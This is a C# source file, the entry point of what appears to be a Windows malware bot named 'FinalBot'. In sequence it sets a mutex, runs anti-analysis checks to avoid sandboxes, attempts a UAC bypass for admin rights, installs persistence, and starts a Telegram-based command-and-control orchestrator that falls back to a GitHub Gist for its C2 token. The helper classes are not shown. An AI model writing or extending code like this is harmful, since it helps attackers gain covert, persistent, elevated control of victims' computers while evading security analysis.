using System;
using System.IO;
using System.Diagnostics;
using System.Threading;
using System.Threading.Tasks;
using VanguardCore;

namespace FinalBot
{
    class Program
    {
        private static Mutex? _mutex;

        static async Task Main(string[] args)
        {
            // 1. Single Instance Check
            bool createdNew;
            _mutex = new Mutex(true, "Global\\FinalBot_Mutex_Alpha_99", out createdNew);
            if (!createdNew) return;

            // 2. Anti-Analysis Check
            if (SafetyManager.VerifySystemContext()) return;

            // 3. UAC Check & Bypass
            if (!ElevationService.IsAdmin())
            {
                ElevationService.RequestElevation(Process.GetCurrentProcess().MainModule?.FileName ?? "FinalBot.exe");
                return; 
            }

            // 4. Persistence
            Persistence.Install();

            // 5. Start Orchestrator
            try 
            {
                ConfigManager.Load();
                
                string token = ConfigManager.Get("BOT_TOKEN");
                string adminId = ConfigManager.Get("ADMIN_ID");
                
                if (string.IsNullOrEmpty(token) || token == "YOUR_TELEGRAM_BOT_TOKEN")
                {
                    Logger.Warn("[C2] Primary token missing or invalid. Attempting Gist fallback...");
                    var fallback = await GistService.GetFallbackConfigAsync();
                    if (fallback.HasValue)
                    {
                        token = fallback.Value.Token;
                        adminId = fallback.Value.ChatId;
                        ConfigManager.Set("BOT_TOKEN", token);
                        ConfigManager.Set("ADMIN_ID", adminId);
                    }
                    else
                    {
                        Logger.Error("[C2] FATAL: Cannot start bot, no token available.");
                        return;
                    }
                }

                var orchestrator = new BotOrchestrator(token, adminId);
                await orchestrator.StartAsync();
            }
            catch (Exception ex)
            {
                Logger.Error("Fatal application error", ex);
                LogCrash(ex);
            }
        }

        private static void LogCrash(Exception ex)
        {
            try {
                File.AppendAllText("C:\\Users\\Public\\crash.log", $"[CRITICAL] {DateTime.Now}: {ex}\n");
            } catch {}
        }
    }
}
